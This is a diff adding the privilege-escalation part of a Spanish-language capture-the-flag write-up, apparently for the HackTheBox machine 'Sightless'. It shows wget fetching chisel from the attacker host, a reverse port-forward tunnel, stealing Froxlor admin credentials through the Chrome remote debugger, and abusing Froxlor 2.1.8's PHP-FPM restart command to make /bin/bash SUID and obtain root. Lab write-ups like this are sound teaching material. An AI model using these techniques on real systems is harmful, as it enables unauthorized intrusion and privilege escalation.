@@ -17,6 +17,8 @@ image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b82
 * Hydra brute force to validate passwords
 * Monitoring system process with pspy
 * Chisel Remote Port Forwarding
+* Chrome Remote Debugger Pentesting
+* Froxlor Authenticated RCE via PHP-FPM
 
 ## Enumeration
 
@@ -321,3 +323,136 @@ Investigando averiguo que el parámetro --remote-debugging-port , habilita la de
 * [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
 
 ![imagen](https://github.com/user-attachments/assets/c1b18840-387c-40e3-9e4e-c046ee096793)
+
+Ejecuto el comando netstat para ver los puertos internos abiertos, puedo observar puertos bastante llamativos como el 8080, 46687, 39391, 33617, 3000
+
+```bash
+michael@sightless:/tmp$ netstat -tulpen
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      115        26880      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        23379      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          25797      -                   
+tcp        0      0 127.0.0.1:46687         0.0.0.0:*               LISTEN      1001       27278      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      115        26757      -                   
+tcp        0      0 127.0.0.1:39391         0.0.0.0:*               LISTEN      1001       27654      -                   
+tcp        0      0 127.0.0.1:33617         0.0.0.0:*               LISTEN      0          25863      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          26238      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          25753      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          25783      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      116        25884      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      0          25764      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        23378      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          23391     
+```
+
+Utilzaré chisel para realizar un Remote Port Forwarding y exponer los servicios locales a mi máquina remota, para ello me transfiero el binario
+
+```bash
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```bash
+michael@sightless:/tmp$ wget http://10.10.14.160:8000/chisel
+--2025-01-17 14:21:47--  http://10.10.14.160:8000/chisel
+Connecting to 10.10.14.160:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8077312 (7.7M) [application/octet-stream]
+Saving to: ‘chisel
+```
+
+Ejecuto chisel como servidor en mi máquina de atacante, escuchando por el puerto 1234 y creando un túnel inverso
+
+```bash
+./chisel server --reverse -p 1234
+2025/01/17 15:22:32 server: Reverse tunnelling enabled
+2025/01/17 15:22:32 server: Fingerprint Cq9ffrNtMD6l+/Nv28Tu0ByRkh0g48KPwVakVOFn8/Y=
+2025/01/17 15:22:32 server: Listening on http://0.0.0.0:1234
+```
+
+Ejecuta chisel como cliente en la máquina victima y me conecto al tunel de mi máquina de atacante redirigiendo todo el tráfico de los puertos 8080, 46687, 39391, 33617, 3000
+
+```bash
+michael@sightless:/tmp$ ./chisel client 10.10.14.160:1234 R:8080:0.0.0.0:8080 R:46687:0.0.0.0:46687 R:39391:0.0.0.0:39391 R:33617:0.0.0.0:33617 R:3000:0.0.0.0:3000
+2025/01/17 14:30:47 client: Connecting to ws://10.10.14.160:1234
+2025/01/17 14:30:48 client: Connected (Latency 36.055714ms)
+```
+
+```bash
+2025/01/17 15:30:49 server: session#1: tun: proxy#R:8080=>0.0.0.0:8080: Listening
+2025/01/17 15:30:49 server: session#1: tun: proxy#R:46687=>0.0.0.0:46687: Listening
+2025/01/17 15:30:49 server: session#1: tun: proxy#R:39391=>0.0.0.0:39391: Listening
+2025/01/17 15:30:49 server: session#1: tun: proxy#R:33617=>0.0.0.0:33617: Listening
+2025/01/17 15:30:49 server: session#1: tun: proxy#R:3000=>0.0.0.0:3000: Listening
+```
+
+El siguiente paso es abrir el navegador chrome e introducir la cadena chrome://inspect/#devices en la barra de URL
+
+![imagen](https://github.com/user-attachments/assets/6d5e92cf-ce1a-4e2e-8129-3ee6cf42becb)
+
+A continuación, hay que hacer clic en Configure e introducir los puertos para ir porbando cual es el correcto, en este caso el puerto correcto es 46687
+
+![imagen](https://github.com/user-attachments/assets/0e26f26a-fa28-4d0d-887b-aa9bde3233d8)
+
+Puedo observar un subdominio el cual es admin.sightless.htb y accede a Froxlor a través del puerto 8080
+
+![imagen](https://github.com/user-attachments/assets/9c370935-35ea-4df3-b69a-10affac51976)
+
+> Hay que añadir el dominio admin.sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP
+{: .prompt-tip }
+
+Al inspeccionar el objetivo remoto consigo ver que se está logueando en el panel de Froxlor y obtengo las credenciales de acceso las cuales son admin:ForlorfroxAdmin
+
+![imagen](https://github.com/user-attachments/assets/d9db8d11-3135-4e87-8955-2eb51851bcff)
+
+Me dirigo al panel de autenticación a través del puerto 8080 y accedo haciendo uso de las credenciales
+
+![imagen](https://github.com/user-attachments/assets/6dfeb893-ed27-448e-ad80-7b46254da0b7)
+
+Al acceder lo primero que me llama la atencion en la parte superior derecha es la versión de Floxror, la cual es 2.1.8
+
+![imagen](https://github.com/user-attachments/assets/27286ff7-dfe7-486d-9518-64102a53c71b)
+
+> Sabiendo que es Froxlor y que la versión es 2.1.8 puedo buscar información sobre posibles vulnerabilidades existentes
+{: .prompt-info }
+
+Investigando doy con un articulo el cual explica como realizar un RCE en PHP-FPM versions, la vulnerabilidad se acontece al crear un nuevo PHP version y en el apartado php-fpm restart command inyectar codigo arbitrario, el cual se ejecutara al reiniciar el servicio.
+
+* [Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM](https://medium.com/@sarperavci/disclosing-froxlor-v2-x-authenticated-rce-as-root-vulnerability-via-php-fpm-be23febb68c7)
+
+![imagen](https://github.com/user-attachments/assets/226ad0c5-c53a-49c1-a8b4-3329953a7f4d)
+
+Accedo a PHP-FPM versions y hago clic sobre create new PHP version.
+
+![imagen](https://github.com/user-attachments/assets/acf336d2-7ea3-4e5a-8afe-c190eb392cd4)
+
+En el apartado php-fpm restart commando doy permisos SUID a /bin/bash
+
+![imagen](https://github.com/user-attachments/assets/3343accc-31f8-41b4-9ad4-a52bebcd9042)
+
+![imagen](https://github.com/user-attachments/assets/834ea242-102e-41e0-9a64-d7e0beb4b262)
+
+Me dirigo a System/Settings y PHP-FPM, deshabilito php-fpm y guardo los cambios
+
+![imagen](https://github.com/user-attachments/assets/d4123189-fed8-4376-85ac-80c51f4d3d34)
+
+![imagen](https://github.com/user-attachments/assets/bfd89824-1552-4a23-8ae1-2492dedfb514)
+
+Vuelvo a entrar y activo php-fpm y guardo los cambios
+
+![imagen](https://github.com/user-attachments/assets/38c25550-019c-4e01-aa63-d8dbe73ea1ff)
+
+![imagen](https://github.com/user-attachments/assets/0210ab7c-ecaf-4cd5-a51d-8fb23cc8f489)
+
+Por ultimo compruebo que se hayan otorgado los permisos SUID y spawneeo un shell como root
+
+```bash
+michael@sightless:/tmp$ ls -la /bin/bash
+-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
+michael@sightless:/tmp$ bash -p
+bash-5.1# whoami
+root
+```
